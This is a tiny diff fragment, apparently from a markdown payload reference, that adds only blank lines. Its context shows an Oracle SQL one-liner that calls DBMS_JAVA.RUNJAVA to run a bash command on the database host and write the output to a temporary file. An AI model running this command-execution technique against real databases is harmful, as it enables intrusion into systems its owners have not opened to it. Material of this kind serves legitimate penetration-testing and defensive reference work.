@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:23:12.139738+00:00'
 ```sql
 SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL
 ```
+
+
